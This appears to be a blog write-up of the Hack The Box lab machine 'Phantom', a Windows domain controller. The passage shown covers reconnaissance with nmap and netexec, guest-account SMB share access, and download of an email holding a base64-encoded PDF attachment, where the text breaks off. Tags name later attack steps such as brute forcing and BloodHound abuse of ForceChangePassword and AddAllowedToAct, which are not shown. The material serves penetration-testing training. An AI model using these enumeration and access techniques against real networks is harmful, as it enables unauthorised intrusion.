---
title: Phantom
date: 2026-04-30
ShowToc: true
draft: false
TocOpen: true
tags:
  - blog
  - HTB
  - Port53-DNS-Discovery-Host
  - Port139-135-SMB-anonymous-login
  - Port139-135-SMB-rid-brute
  - Port139-135-SMB-BurteForce
  - Lateral-Movement-account-verify-nxc
  - Bloodhound-vectory-view-all-user
  - Port139-135-SMB-enumerating
  - Decode-company-name-simple-mutation-hashcat-rule
  - Decode-veracrypt
  - Bloodhound-vectory-ForceChangePassword
  - Bloodhound-vectory-AddAllowedToAct
  - windows
lastmod: 2026-05-07T05:34:53.938Z
---
# Box Info

{{< htb-info "https://www.hackthebox.com/machines/Phantom" >}}

***

# Recon

### PORT & IP SCAN

```
┌──(root㉿kali)-[~/Desktop]
└─# sudo nmap -sC -sV -p $(grep -Eo '^[0-9]+/tcp' openPort.txt | cut -d/ -f1 | paste -sd, -) -T4 10.129.234.63  -oN serviceScan.txt
Starting Nmap 7.98 ( https://nmap.org ) at 2026-04-30 03:00 -0400
Nmap scan report for 10.129.234.63
Host is up (0.69s latency).

PORT      STATE SERVICE       VERSION
53/tcp    open  domain        Simple DNS Plus
88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2026-04-30 07:00:19Z)
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: phantom.vl, Site: Default-First-Site-Name)
445/tcp   open  microsoft-ds?
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp   open  tcpwrapped
3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: phantom.vl, Site: Default-First-Site-Name)
3269/tcp  open  tcpwrapped
3389/tcp  open  ms-wbt-server Microsoft Terminal Services
| rdp-ntlm-info: 
|   Target_Name: PHANTOM
|   NetBIOS_Domain_Name: PHANTOM
|   NetBIOS_Computer_Name: DC
|   DNS_Domain_Name: phantom.vl
|   DNS_Computer_Name: DC.phantom.vl
|   DNS_Tree_Name: phantom.vl
|   Product_Version: 10.0.20348
|_  System_Time: 2026-04-30T07:01:12+00:00
| ssl-cert: Subject: commonName=DC.phantom.vl
| Not valid before: 2026-04-29T06:07:41
|_Not valid after:  2026-10-29T06:07:41
|_ssl-date: 2026-04-30T07:01:52+00:00; 0s from scanner time.
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0
9389/tcp  open  mc-nmf        .NET Message Framing
49664/tcp open  msrpc         Microsoft Windows RPC
49668/tcp open  msrpc         Microsoft Windows RPC
56528/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
56529/tcp open  msrpc         Microsoft Windows RPC
56536/tcp open  msrpc         Microsoft Windows RPC
58800/tcp open  msrpc         Microsoft Windows RPC
58825/tcp open  msrpc         Microsoft Windows RPC
Service Info: Host: DC; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-time: 
|   date: 2026-04-30T07:01:15
|_  start_date: N/A
| smb2-security-mode: 
|   3.1.1: 
|_    Message signing enabled and required

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 112.56 seconds
                                                                    
```

{{< toggle "Tag 🏷️" >}}

{{< tag "Port53-DNS-Discovery-Host" >}}The box shows many of the ports associated with a [Windows Domain Controller](https://0xdf.gitlab.io/cheatsheets/os#windows-domain-controller). The domain is `phantom.vl`, and the hostname is `DC`.

I’ll use `netexec` to make a `hosts` file entry and put it at the top of my `/etc/hosts` file:

{{< /toggle >}}

```
┌──(root㉿kali)-[~/Desktop]
└─#  netexec smb 10.129.234.63 --generate-hosts-file hosts
SMB         10.129.234.63   445    DC               [*] Windows Server 2022 Build 20348 x64 (name:DC) (domain:phantom.vl) (signing:True) (SMBv1:False) 
                                         
```

{{< code >}}\
127.0.0.1       localhost\
127.0.1.1       kali\
::1             localhost ip6-localhost ip6-loopback\
ff02::1         ip6-allnodes\
ff02::2         ip6-allrouters\
10.129.234.63     DC.phantom.vl phantom.vl DC

# Added by Docker Desktop

# To allow the same kube context to work on the host and the container:

127.0.0.1       kubernetes.docker.internal

# End of section

{{< /code >}}

### SMB-anonymous

{{< toggle "Tag 🏷️" >}}

{{< tag "Port139-135-SMB-anonymous-login" >}} `netexec` already called out that null auth was enabled on this host when I generate the `hosts` file line, but because this is a DC, that’ll always be on. I’ll check for null auth that can do anything and the guest account, and find the guest account can authenticate with no password:

{{< /toggle >}}

```
┌──(root㉿kali)-[~/Desktop]
└─# netexec smb 10.129.234.63  -u 'guest' -p '' --shares
SMB         10.129.234.63   445    DC               [*] Windows Server 2022 Build 20348 x64 (name:DC) (domain:phantom.vl) (signing:True) (SMBv1:False) 
SMB         10.129.234.63   445    DC               [+] phantom.vl\guest: 
SMB         10.129.234.63   445    DC               [*] Enumerated shares
SMB         10.129.234.63   445    DC               Share           Permissions     Remark
SMB         10.129.234.63   445    DC               -----           -----------     ------
SMB         10.129.234.63   445    DC               ADMIN$                          Remote Admin
SMB         10.129.234.63   445    DC               C$                              Default share
SMB         10.129.234.63   445    DC               Departments Share                 
SMB         10.129.234.63   445    DC               IPC$            READ            Remote IPC
SMB         10.129.234.63   445    DC               NETLOGON                        Logon server share 
SMB         10.129.234.63   445    DC               Public          READ            
SMB         10.129.234.63   445    DC               SYSVOL                          Logon server share 

```

These are the default DC shares, as well as `Departments Share` and `Public`. guest doesn’t have read access to `Departments Share`:

```
┌──(root㉿kali)-[~/Desktop]
└─# smbclient -N '//dc.phantom.vl/Departments Share'
Try "help" to get a list of possible commands.
smb: \> ls
NT_STATUS_ACCESS_DENIED listing \*
smb: \> 

```

```
┌──(root㉿kali)-[~/Desktop]
└─# smbclient -N //dc.phantom.vl/Public
Try "help" to get a list of possible commands.
smb: \> ls
  .                                   D        0  Thu Jul 11 11:03:14 2024
  ..                                DHS        0  Thu Aug 14 07:55:49 2025
  tech_support_email.eml              A    14565  Sat Jul  6 12:08:43 2024

                6127103 blocks of size 4096. 2383278 blocks available
smb: \> get tech_support_email.eml
getting file \tech_support_email.eml of size 14565 as tech_support_email.eml (27.8 KiloBytes/sec) (average 27.8 KiloBytes/sec)
smb: \> 

```

{{< code >}}\
Content-Type: multipart/mixed; boundary="===============6932979162079994354=="\
MIME-Version: 1.0\
From: alucas@phantom.vl\
To: techsupport@phantom.vl\
Date: Sat, 06 Jul 2024 12:02:39 -0000\
Subject: New Welcome Email Template for New Employees

\--===============6932979162079994354==\
Content-Type: text/plain; charset="us-ascii"\
MIME-Version: 1.0\
Content-Transfer-Encoding: 7bit

Dear Tech Support Team,

I have finished the new welcome email template for onboarding new employees.

Please find attached the example template. Kindly start using this template for all new employees.

Best regards,\
Anthony Lucas

\--===============6932979162079994354==\
Content-Type: application/pdf\
MIME-Version: 1.0\
Content-Transfer-Encoding: base64\
Content-Disposition: attachment; filename="welcome\_template.pdf"

JVBERi0xLjcKJcOkw7zDtsOfCjIgMCBvYmoKPDwvTGVuZ3RoIDMgMCBSL0ZpbHRlci9GbGF0ZURl\
Y29kZT4+CnN0cmVhbQp4nI1Vy4rcMBC8+yt0zsFTXZYsGcyAJY8hgT0sGcgh5LBksyE5LGRYyO+H\
bnsfM7OeyckvSdVV1dVGLe5vtRkOT78e7r4/uXxTqj8ODjWYXCtSd1Fc7Obr4Uf15YN7rHY3pdp8\
frp7vL873Pf95qZ8HB222zwuux3c4WeV91Vo6+SioPbB7e/dZhIndPuHrz1kK7EH0cAjoAURkRAQ\
0WFARrGnFuP22/5TtdtXt+/jyipum1inY9weOxAZE6JARCiNeAnb/e8LCFxHCKHmKrNoQHqltPCi\
/CjpheeALJ1+lwFBMiICCqIUBN0pSa5xb9YrY6zbE+6yM7mDTK+lLdCqRyZAvYPXb5JANUF0bUNQ\
Lqvk12sBapzUQi5oBVnNp6gjJBvx9P/rTFjFDKk9daZHh0wQMiGovIqpzUaVPbFFy8iExIAJCeNl\
7HYdO6Qz7dGh0c4z1lFdYIcoUQ2f2+HVCWR4DYXMITBndKXuQMIALqe865OMiByUIaKt83qqNp8M\
iOa6VhFQCGZEsT4gkDDZ2w6NrrzMPq6z9/48dYoxx1yDXpYQaMzTm/b3c/DZHXcmy7FvppudJDNr\
VcBqRuZoT9PR/lEiJmO4KK9qyhV/0zpDiWe9xR3HN0xeoq18tDJOks03rdi0t7ir2wVcxsLMcvZC\
vfegOsRRV6Cxu8nun0eIuWm6RUN+HS7P3CGZhQVzT9sIssTNul1xuVvXAM3pTO/tbI/hGJPq35uB\
LqN0aC7jyvrPxMdw1l462BZ7J5DdPD21va/ArP87fMvTmfW1b6DhO/tDRZ33DbYi6Gd1j8f2rfsH\
gCembQplbmRzdHJlYW0KZW5kb2JqCgozIDAgb2JqCjYxNwplbmRvYmoKCjE2IDAgb2JqCjw8L0xl\
bmd0aCAxNyAwIFIvRmlsdGVyL0ZsYXRlRGVjb2RlL0xlbmd0aDEgODQwOD4+CnN0cmVhbQp4nN1Z\
eVwT1/Y/d5ZEXNAIAawsE8JeCEpYCrZYbF1wAQUEtXUJyUCiIZNmBhStYtyq1qWuffiQ1rWWp9Za\
1Grrvis+tetr7etml9/zWWut7WuBDL/PvTMg2uXze//+kHxy5t5zzz3nfL/n3DsoeSp56ApzgQbO\
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\
rCBABRkVQIBycAIPZSCACyQQIRksHXvF37dvHvDgARtwMETVLgAeyqESnGTNn+tyD2hzYAYT9Cef\
/25lMdEQwUHmOWLDDGYY8DtrxT/YJw+GQNKf+O8gKy3AgQQesIANeKggWtOAAwHKgIOhnfLHQS64\
wAomGEV2FkCCanCrM3glxsAF5Z00C0ECHqqIziiwEMx4EMn6zr5MBwvxxkZmMUtcwJMoS6EauD+1\
w6lrLUTGHmDfqoiWg6xJBA48hAEessre4adIVolE4ok/ZQ94wRFWWQhGSsYqgCcZc4AVLOAEJ/FQ\
YZxb3bVUzdh0lZXt7Mb6cSBBBcSD6QHO44yXqbhzZNRNqqBKzQSONQlEsJIoeOIbljByFigFBzjJ\
boo3doKkhdSPEplIPLN25Mqmxob9dJORJBgMlWRPN7GLdyiBoTDydy0qOZM6WcN4OIm/YifbLuKt\
jYwJHfnFWk51JyViJ+HatA5syki1Kzm0EWtJf5Dlsk6VIJFc4pzYVLQVXglghUqCnVJvbmJd+k3m\
LCS/grrOTepGUn2pABFMHZ1H6TvTyT/TfZ2mc//BGUpWq0WA5D9YXfFARd2zgFGrBBvpBEWEueJ9\
faOQ5FQiFeQh2XCo2cRY84TdCn8qCUoKcu3YFEIuQTef7Oq6z/LI+yzgGvq9rtSf8Pi/8cymctFD\
EKwkbGrnd3sVR0IOFJI+UgiRwMEg8oyfEgknc6EIhkE+jIUi8pwDBVAAOZAHRZALg8nafCgADp6A\
fMiDJ8mKXCIrc0NI9eXBeOBgBOQSHWybVytWyRMPM0gVtvNIYaRSmzjD2HMTiZUnEf73eb3H8/a1\
IlljJb0Ia3KEgy7SxS2EUYmEmTxhpIN4piDSubKdxEsHYbjUab5c7SgecHVUWjUIpO4xRxSflDqV\
/g+oPlgPSn9ygJvUo4n45gQTibEckknmRyrvVso7cSys/73/Dn8TtS3cwyyH/wUfjiv4CmVuZHN0\
cmVhbQplbmRvYmoKCjE3IDAgb2JqCjU0MTMKZW5kb2JqCgoxOCAwIG9iago8PC9UeXBlL0ZvbnRE\
ZXNjcmlwdG9yL0ZvbnROYW1lL0JBQUFBQStBcmltb05GLVJlZ3VsYXIKL0ZsYWdzIDQKL0ZvbnRC\
Qm94Wy01NDMgLTM4OSAyNzk2IDEwNDNdL0l0YWxpY0FuZ2xlIDAKL0FzY2VudCA5MjEKL0Rlc2Nl\
bnQgLTIyOAovQ2FwSGVpZ2h0IDEwNDIKL1N0ZW1WIDgwCi9Gb250RmlsZTIgMTYgMCBSCj4+CmVu\
ZG9iagoKMTkgMCBvYmoKPDwvTGVuZ3RoIDQ0MC9GaWx0ZXIvRmxhdGVEZWNvZGU+PgpzdHJlYW0K\
eJxdk8+OmzAQh+9+Ch93DytsY3BWQkhZspE49I9K9wEITFKkjUEOOeTtq5kfbaUeQJ/NzPB5NM6a\
9tDGac2+p3noaNXnKY6JbvM9DaRPdJmisk6P07BuK3kP135RWdMeusdtpWsbz3NVqewHXabbmh76\
aT/OJ3pW2bc0UpriRT99NN2zyrr7snzSleKqjaprPdJZZc2XfvnaXymTrJd2pLhO6+Plo+n+Bfx8\
LKSdrC1Uhnmk29IPlPp4IVUZU+vqeKwVxfG/b36HlNN5+NUnVRlb68qYItSqMk64LJhzcMPswTlz\
AT4yl+ADcxB2hnknHDzzK+rL/h7xO+Y3sGVuwO/MB9SR/XdhL3WOqOlqVVkjnLObhb/nXAt/z7kW\
/p7dLPw9n8vCP5d4+Af2sfAvX5nhX/J/LfxDyQz/IDHwD1Jz8xe3zV/qb/6yv/lznx38A/fTwT/f\
M8O/4JoO/oXEwL/gOm7zZzcH/5x76+DvheGfSx34l/Jf+Hs+i4O/4x46+AfJhX8pMZs/n9dt/tzb\
HP6FlwHbJolHje/CnxHWwz0liqtcGJlbntgp0t87tcwLZ8nzGwLy24gKZW5kc3RyZWFtCmVuZG9i\
agoKMjAgMCBvYmoKPDwvVHlwZS9Gb250L1N1YnR5cGUvVHJ1ZVR5cGUvQmFzZUZvbnQvQkFBQUFB\
K0FyaW1vTkYtUmVndWxhcgovRmlyc3RDaGFyIDAKL0xhc3RDaGFyIDQ4Ci9XaWR0aHNbMCA5NDMg\
NTU2IDIyMiA1MDAgNTU2IDgzMyAyNzcgMjc3IDY2NiA1NTYgNTU2IDU1NiAyNzcgNzIyIDMzMwo1\
ODMgNzIyIDY2NiA4MzMgNjY2IDU4MyA1MDAgMjIyIDU1NiA1MDAgNTAwIDU1NiA1NTYgMjc3IDY2\
NiA3MjIKNTAwIDI3NyA3MjIgNjY2IDcyMiA1NTYgNTU2IDEwMTUgNTU2IDU1NiA2MTAgMjc3IDU1\
NiAyNzcgMjc3IDU1Ngo2MTAgXQovRm9udERlc2NyaXB0b3IgMTggMCBSCi9Ub1VuaWNvZGUgMTkg\
MCBSCj4+CmVuZG9iagoKMjEgMCBvYmoKPDwvRjEgMjAgMCBSCj4+CmVuZG9iagoKMjIgMCBvYmoK\
PDwKL0ZvbnQgMjEgMCBSCi9Qcm9jU2V0Wy9QREYvVGV4dF0KPj4KZW5kb2JqCgoxIDAgb2JqCjw8\
L1R5cGUvUGFnZS9QYXJlbnQgMTUgMCBSL1Jlc291cmNlcyAyMiAwIFIvTWVkaWFCb3hbMCAwIDYx\
MiA3OTJdL1N0cnVjdFBhcmVudHMgMAovQ29udGVudHMgMiAwIFI+PgplbmRvYmoKCjUgMCBvYmoK\
PDwvVHlwZS9TdHJ1Y3RFbGVtCi9TL1N0YW5kYXJkCi9QIDQgMCBSCi9QZyAxIDAgUgovQSA8PC9P\
L0xheW91dC9QbGFjZW1lbnQvQmxvY2sKPj4KL0tbMCBdCj4+CmVuZG9iagoKNiAwIG9iago8PC9U\
eXBlL1N0cnVjdEVsZW0KL1MvU3RhbmRhcmQKL1AgNCAwIFIKL1BnIDEgMCBSCi9BIDw8L08vTGF5\
b3V0L1BsYWNlbWVudC9CbG9jawo+PgovS1sxIF0KPj4KZW5kb2JqCgo3IDAgb2JqCjw8L1R5cGUv\
U3RydWN0RWxlbQovUy9TdGFuZGFyZAovUCA0IDAgUgovUGcgMSAwIFIKL0EgPDwvTy9MYXlvdXQv\
UGxhY2VtZW50L0Jsb2NrCj4+Ci9LWzIgXQo+PgplbmRvYmoKCjggMCBvYmoKPDwvVHlwZS9TdHJ1\
Y3RFbGVtCi9TL1N0YW5kYXJkCi9QIDQgMCBSCi9QZyAxIDAgUgovQSA8PC9PL0xheW91dC9QbGFj\
ZW1lbnQvQmxvY2sKPj4KL0tbMyBdCj4+CmVuZG9iagoKOSAwIG9iago8PC9UeXBlL1N0cnVjdEVs\
ZW0KL1MvU3RhbmRhcmQKL1AgNCAwIFIKL1BnIDEgMCBSCi9BIDw8L08vTGF5b3V0L1BsYWNlbWVu\
dC9CbG9jawo+PgovS1s0IF0KPj4KZW5kb2JqCgoxMCAwIG9iago8PC9UeXBlL1N0cnVjdEVsZW0K\
L1MvU3RhbmRhcmQKL1AgNCAwIFIKL1BnIDEgMCBSCi9BIDw8L08vTGF5b3V0L1BsYWNlbWVudC9C\
bG9jawo+PgovS1s1IF0KPj4KZW5kb2JqCgoxMSAwIG9iago8PC9UeXBlL1N0cnVjdEVsZW0KL1Mv\
U3RhbmRhcmQKL1AgNCAwIFIKL1BnIDEgMCBSCi9BIDw8L08vTGF5b3V0L1BsYWNlbWVudC9CbG9j\
awo+PgovS1s2IDcgXQo+PgplbmRvYmoKCjEyIDAgb2JqCjw8L1R5cGUvU3RydWN0RWxlbQovUy9T\
dGFuZGFyZAovUCA0IDAgUgovUGcgMSAwIFIKL0EgPDwvTy9MYXlvdXQvUGxhY2VtZW50L0Jsb2Nr\
Cj4+Ci9LWzggOSBdCj4+CmVuZG9iagoKMTMgMCBvYmoKPDwvVHlwZS9TdHJ1Y3RFbGVtCi9TL1N0\
YW5kYXJkCi9QIDQgMCBSCi9QZyAxIDAgUgovQSA8PC9PL0xheW91dC9QbGFjZW1lbnQvQmxvY2sK\
Pj4KL0tbMTAgXQo+PgplbmRvYmoKCjE0IDAgb2JqCjw8L1R5cGUvU3RydWN0RWxlbQovUy9TdGFu\
ZGFyZAovUCA0IDAgUgovUGcgMSAwIFIKL0EgPDwvTy9MYXlvdXQvUGxhY2VtZW50L0Jsb2NrCj4+\
Ci9LWzExIF0KPj4KZW5kb2JqCgo0IDAgb2JqCjw8L1R5cGUvU3RydWN0RWxlbQovUy9Eb2N1bWVu\
dAovUCAyMyAwIFIKL1BnIDEgMCBSCi9LWzUgMCBSICA2IDAgUiAgNyAwIFIgIDggMCBSICA5IDAg\
